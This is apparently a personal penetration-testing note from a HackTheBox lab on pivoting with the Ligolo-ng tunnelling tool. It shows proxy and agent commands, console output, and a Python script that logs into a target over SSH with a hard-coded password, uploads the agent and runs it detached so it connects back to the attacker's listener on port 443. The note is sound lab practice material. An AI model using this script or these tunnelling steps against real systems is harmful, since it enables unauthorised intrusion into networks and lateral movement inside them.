---
title: Ligolo-ng
date: 2026-08-04
ShowToc: true
draft: false
TocOpen: true
password:
isPrivate: true
tags:
  - blog
  - note-ad
lastmod: 2026-08-10T07:45:17.581Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/yourmachine" >}}

![26LJANHi.canvas](/ob/Canvas/26LJANHi.canvas)\
{{< canvas "26LJANHi.canvas" >}}

### Download the agent

#### Target Linux

```
https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
```

#### Windows

### Download the proxy

```
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz &&  tar -xzvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz && rm -rf README.md LICENSE ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
```

### Start the proxy

The 443 port is for bypassing the firewall due to they may block the 11063

```
sudo ./proxy -laddr 0.0.0.0:443 -selfcert -v
```

### Start the agent

The 443 port is for bypassing the firewall due to they may block the 11063

```
agent -connect 10.10.14.69:443 -ignore-cert
```

### auto start the tunnel

### manual create the tunnel

For example , we have one session , but still dont set the interface to it , and use the tunnel\_list to verify it

```
ligolo-ng » tunnel_list
┌──────────────────────────────────────────────────────────────────────────┐
│ Active sessions and tunnels                                              │
├───┬─────────────────────────────────────────────────┬───────────┬────────┤
│ # │ AGENT                                           │ INTERFACE │ STATUS │
├───┼─────────────────────────────────────────────────┼───────────┼────────┤
│ 1 │ daniel@mail - 10.10.110.35:39812 - a2dead2d2b72 │           │ Online │
└───┴─────────────────────────────────────────────────┴───────────┴────────┘

```

and we need to create the INTERFACE

```
ligolo-ng » interface_create --name test1 
INFO[0583]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/interfaces.go:91 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func3() Creating a new test1 interface...            
INFO[0583]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/interfaces.go:95 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func3() Interface created!   
```

Use the interface\_list to verify

```
ligolo-ng » interface_list 
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Interface list                                                                                                                                                           │
├───┬─────────────────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┬────────────────────┤
│ # │ TAP NAME        │ DST ROUTES                                                                                                                    │ STATE              │
├───┼─────────────────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────┤                                                                           │ Pending - 1 routes │
│ 1 │ tun0            │ 10.10.8.0/22,10.10.14.0/23,10.10.110.0/24,10.13.37.0/24,10.13.38.0/24,10.129.0.0/16,dead:beef::/64,dead:beef:2::/64,fe80::/64 │ Active - 9 routes  │
│ 2 │ test1           │                                                                                                                               │                    │
└───┴─────────────────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴────────────────────┘
Interfaces and routes with "Pending" state will be created on tunnel start.

```

add the route into the interface

```
ligolo-ng » route_add --name test1 --route 192.168.110.0/24
INFO[0824]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/interfaces.go:173 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func7() Route created.  
```

verify it

```
ligolo-ng » interface_list
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Interface list                                                                                                                                                           │
├───┬─────────────────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┬────────────────────┤
│ # │ TAP NAME        │ DST ROUTES                                                                                                                    │ STATE              │
├───┼─────────────────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────┤
│ 0 │ tun0            │ 10.10.8.0/22,10.10.14.0/23,10.10.110.0/24,10.13.37.0/24,10.13.38.0/24,10.129.0.0/16,dead:beef::/64,dead:beef:2::/64,fe80::/64 │ Active - 9 routes  │
│ 1 │ test1           │ 192.168.110.0/24                                                                                                              │ Active - 1 routes  │

```

switch the session and start it

```
ligolo-ng » session
? Specify a session : 1 - daniel@mail - 10.10.110.35:39812 - a2dead2d2b72
[Agent : daniel@mail] » start --tun test1
INFO[0929]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/app.go:148 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel() Starting tunnel to daniel@mail (a2dead2d2b72) 

```

### manual remove the tunnel

view the active interface , and stop it , and see the 'Closing tunnel to daniel@mail'

```
[Agent : daniel@mail] » tunnel_stop 
[Agent : daniel@mail] » INFO[1106]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/app.go:190 github.com/nicocha30/ligolo-ng/cmd/proxy/app.StartTunnel.func1() Closing tunnel to daniel@mail (a2dead2d2b72)... 
[Agent : daniel@mail] » 
[Agent : daniel@mail] » 
[Agent : daniel@mail] » interface_list
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Interface list                                                                                                                                                           │
├───┬─────────────────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┬────────────────────┤
│ # │ TAP NAME        │ DST ROUTES                                                                                                                    │ STATE              │
├───┼─────────────────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┼────────────────────┤
│ 0 │ alertdeathcry   │ 192.168.110.51/24                                                                                                             │ Pending - 1 routes │
│ 1 │ creativemenace  │ 192.168.110.51/24                                                                                                             │ Pending - 1 routes │
│ 2 │ mutualholy      │                                                                                                                               │                    │
│ 3 │ valuedcotedurho │ 192.168.110.51/24                                                                                                             │ Pending - 1 routes │
│ 4 │ tun0            │ 10.10.8.0/22,10.10.14.0/23,10.10.110.0/24,10.13.37.0/24,10.13.38.0/24,10.129.0.0/16,dead:beef::/64,dead:beef:2::/64,fe80::/64 │ Active - 9 routes  │
│ 5 │ test1           │ 192.168.110.0/24,fe80::/64                                                                                                    │ Active - 2 routes  │
└───┴─────────────────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴────────────────────┘
Interfaces and routes with "Pending" state will be created on tunnel start.
[Agent : daniel@mail] »  

```

Del the Interface

```
[Agent : daniel@mail] » interface_delete --name test1
? Remove all interface routes and settings from config? Yes
INFO[1213]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/app/interfaces.go:134 github.com/nicocha30/ligolo-ng/cmd/proxy/app.init.0.func5() Interface removed.  
```

### Kill all agent

If you try to connect by agent , but it failed that you need to kill all agent for connect proxy

```
┌─[tester@parrot]─[~/Desktop/HTB/Zephyr]
└──╼ $ssh daniel@10.10.110.35 "killall agent"
```

### Port forward

### python auto set the agent via SSH

1. set the proxy

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Zephyr]
└──╼ $sudo ./proxy -laddr 0.0.0.0:443 -selfcert -v
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000]/home/runner/work/ligolo-ng/ligolo-ng/cmd/proxy/main.go:113 main.main() Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 

```

![Pasted image 20260802230621.png](/ob/Pasted%20image%2020260802230621.png)

2. the start the command

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/Zephyr]
└──╼ $python3 exploit.py 
connecting to the 10.10.110.35 . . .
Connect successfully
Now you are: daniel
[proxy] already exists. Skipping download and extraction.
[agent] binary already exists. Skipping download.
Uploading agent via SCP...
SCP upload failed: scp: /tmp/agent: Text file busy

Verifying agent on the remote target...
File found:
-rwxr-xr-x 1 daniel daniel 6475928 Aug  2 15:01 /tmp/agent
Executing remote command: /tmp/agent -connect 10.10.14.69:443 -ignore-cert
Agent connection command sent successfully!

```

```
import paramiko
import subprocess
import os
import time
from scp import SCPClient

# Connection details
hostname = "10.10.110.35"
port = 22
username = "daniel"
password = "P@ssw0rd"
attacker_IP = subprocess.check_output("ifconfig tun0 | grep 'inet ' | awk '{print $2}'", shell=True, text=True).strip()
print(f"[*] Detected attacker IP (tun0): {attacker_IP}")

if not attacker_IP:
    print("[!] Failed to detect tun0 IP. Is your VPN interface up? Aborting.")
    raise SystemExit(1)

### step 1 connect by ssh

print(f"connecting to the {hostname} . . .")

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    ssh.connect(hostname, port=port, username=username, password=password)
    print("Connect successfully")
except Exception as e:
    print(f"Connection failed: {e}")
    raise SystemExit(1)

### step 2 execute the command

try:
    stdin, stdout, stderr = ssh.exec_command("whoami")
    name = stdout.read().decode().strip()
    print(f"Now you are: {name}")
except Exception as e:
    print(f"Command failed: {e}")

try:
    # Kill any previously running agent so the new one can bind/connect cleanly
    ssh.exec_command("killall agent")
    time.sleep(1)
except Exception as e:
    print(f"Command failed: {e}")

## Step 3 setting up the local proxy binary

proxy_file = "proxy"

if os.path.exists(proxy_file):
    print(f"[{proxy_file}] already exists. Skipping download and extraction.")
else:
    print(f"[{proxy_file}] not found. Downloading and setting up Ligolo-ng...")
    try:
        command = (
            "wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz && "
            "tar -xzvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz && "
            "rm -rf README.md LICENSE ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz"
        )
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        print("Setup completed successfully!")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Command failed with exit code {e.returncode}")
        print(f"Error output: {e.stderr}")

#### kali: download the agent binary (to be uploaded to the target)

agent_file = "ligolo-ng_agent_0.8.2_linux_amd64.tar.gz"
agent_url = f"https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/{agent_file}"

try:
    if os.path.exists("agent"):
        print("[agent] binary already exists. Skipping download.")
    else:
        print("Downloading and setting up the Linux Ligolo-ng agent...")
        command = (
            f"wget -q {agent_url} && "
            f"tar -xzvf {agent_file} && "
            f"rm -rf {agent_file} README.md LICENSE"
        )
        subprocess.run(command, shell=True, check=True)
        print("Agent setup completed successfully!")
except subprocess.CalledProcessError as e:
    print(f"Command failed with exit code {e.returncode}")
except Exception as e:
    print(f"An error occurred: {e}")

#### target: upload the agent

try:
    print("Uploading agent via SCP...")
    with SCPClient(ssh.get_transport()) as scp:
        scp.put("agent", "/tmp/agent")
    print("Upload completed successfully!")

    ssh.exec_command("chmod +x /tmp/agent")
    print("Agent permissions updated to executable.")
except Exception as e:
    print(f"SCP upload failed: {e}")
    raise SystemExit(1)

try:
    print("Verifying agent on the remote target...")
    stdin, stdout, stderr = ssh.exec_command("ls -la /tmp/agent")
    output = stdout.read().decode().strip()
    error = stderr.read().decode().strip()
    if output:
        print(f"File found:\n{output}")
    else:
        print(f"File not found or error: {error}")
except Exception as e:
    print(f"Verification failed: {e}")

### start the target's agent -> connect back to our proxy listener

try:
    # nohup + full stdio redirection + disown so the process detaches from
    # the SSH session and survives the channel closing. Without this, the
    # agent gets SIGHUP'd the moment exec_command's channel is torn down,
    # which shows up on the proxy side as "connects then immediate EOF".
    agent_cmd = (
        f"nohup /tmp/agent -connect {attacker_IP}:443 -ignore-cert "
        f"> /tmp/agent.log 2>&1 < /dev/null & disown"
    )
    print(f"Executing remote command: {agent_cmd}")

    stdin, stdout, stderr = ssh.exec_command(agent_cmd)

    # Give the remote shell a moment to actually fork/detach the process
    # before we tear down the SSH connection.
    time.sleep(3)

    print("Agent connection command sent successfully!")
except Exception as e:
    print(f"Connection failed: {e}")

# Keep the SSH transport open a little longer to make sure the detach
# fully completes (some shells still race this).
time.sleep(2)
ssh.close()
print("[*] Done. Check your ligolo-ng proxy session list.")
```

* if you do it before , please run ssh daniel@10.10.110.35 "killall agent"
